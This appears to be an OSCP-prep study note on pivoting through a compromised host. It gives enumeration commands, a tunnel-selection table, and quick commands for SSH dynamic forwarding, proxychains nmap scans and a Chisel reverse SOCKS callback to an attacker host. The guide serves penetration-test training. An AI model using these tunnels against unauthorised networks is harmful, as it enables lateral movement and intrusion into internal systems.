# 🔀 Pivoting & Port Forwarding (Hub)

> You own a host that can reach an **internal network/service** you can't. Pivoting forwards your tools through it. Common in the OSCP AD set and multi-host scenarios. This is the index — discover the internal net, then pick a tunnel.

Related: [[SSH]] · [[Shells]] · [[Active Directory]] · [[Host Discovery]]

---

## ⚡ 1. DISCOVER THE INTERNAL NETWORK (from the foothold)
Linux foothold:
```bash
ip a ; ip route ; ss -tlnp ; arp -a ; cat /etc/hosts
```
Windows foothold:
```cmd
ipconfig /all & route print & netstat -ano & arp -a
```
**Look for:** a second NIC/subnet (you're on 10.10.x, host also has 172.16.x) → scan it *through* the pivot.

## 🎯 2. PICK A TUNNEL (click into each)
| Situation | Tool | Note |
|---|---|---|
| You have **SSH creds** on the pivot | SSH `-L`/`-D`/`-R` | [[SSH Tunneling]] |
| Only a **shell** (no creds) | Chisel reverse SOCKS | [[Chisel]] |
| Want **native speed / GUI / UDP** | Ligolo-ng TUN route | [[Ligolo-ng]] |
| Using a SOCKS proxy | proxychains (`-sT -Pn`) | [[Proxychains & SOCKS]] |

## 🔁 FOUND → NEXT (router)
| FINDING | GO |
|---|---|
| Second subnet on pivot | scan it through a tunnel |
| SSH creds on pivot | [[SSH Tunneling]] (`-D` SOCKS) |
| Only a shell | [[Chisel]] (reverse SOCKS) |
| Need RDP/Burp/native | [[Ligolo-ng]] |
| SOCKS is up | [[Proxychains & SOCKS]] |
| Internal-only web/DB | local-forward the port, browse 127.0.0.1 |

## ⚠️ COMMON MISTAKES
- SYN-scanning through proxychains (must use `-sT -Pn`) · wrong callback IP (use **tun0**) · forgetting the **route** (ligolo) / editing **proxychains.conf** · wrong tool **arch** · not enumerating the pivot's **second NIC/route** first.

## 📇 QUICK
```bash
ip route ; arp -a                 # find 2nd subnet (Win: route print & arp -a)
```
```bash
ssh -D 1080 user@PIVOT ; proxychains -q nmap -sT -Pn 172.16.1.0/24
```
```bash
./chisel client YOURIP:8000 R:socks        # no SSH creds
```
**Order:** own host → find 2nd subnet → pick tool (SSH creds → [[SSH Tunneling]], else [[Chisel]]/[[Ligolo-ng]]) → SOCKS/route → enumerate internal hosts.
